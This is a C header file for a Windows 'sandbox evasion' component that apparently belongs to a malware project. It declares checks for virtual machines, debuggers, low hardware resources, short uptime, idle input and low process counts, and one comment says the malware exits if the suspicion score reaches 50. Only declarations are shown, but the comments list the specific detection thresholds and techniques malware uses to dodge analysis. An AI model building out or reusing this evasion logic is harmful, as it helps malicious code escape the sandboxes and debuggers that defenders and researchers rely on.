#ifndef SANDBOX_EVASION_H
#define SANDBOX_EVASION_H

#include <windows.h>
#include <stdio.h>

// Ensure Windows types are defined (fallback for IntelliSense)
#ifndef BOOL
typedef int BOOL;
#endif
#ifndef TRUE
#define TRUE 1
#define FALSE 0
#endif
#ifndef DWORD
typedef unsigned long DWORD;
#endif

/*
 * Sandbox Evasion Module
 * Detects if running in a VM or sandbox environment
 * Checks hardware specs, debuggers, and system artifacts to calculate suspicion score
 */

// Evasion result structure
typedef struct _EVASION_RESULT {
    BOOL isSandbox;
    BOOL isVM;
    BOOL isDebugger;
    BOOL hasLowResources;
    DWORD score;  // Suspicion score (0-100)
} EVASION_RESULT;

// Main function - orchestrates all checks and fills result structure
BOOL CheckSandboxEnvironment(EVASION_RESULT* result);

// Detects VM (VMware/VirtualBox/Hyper-V drivers and registry keys)
BOOL CheckVirtualMachine();

// Detects debugger (IsDebuggerPresent, CheckRemoteDebuggerPresent, PEB check)
BOOL CheckDebugger();

// Checks for low resources (< 2 cores, < 4GB RAM, < 80GB disk)
BOOL CheckSystemResources();

// Checks if system uptime is suspiciously short (< 10 minutes)
BOOL CheckUptime();

// Checks for recent user activity (mouse/keyboard input)
BOOL CheckUserActivity();

// Checks if process count is abnormally low (< 50 processes)
BOOL CheckProcessCount();

// Prints evasion results
void PrintEvasionResult(EVASION_RESULT* result);

// Returns TRUE if malware should exit (score >= 50)
BOOL ShouldExit(EVASION_RESULT* result);

#endif // SANDBOX_EVASION_H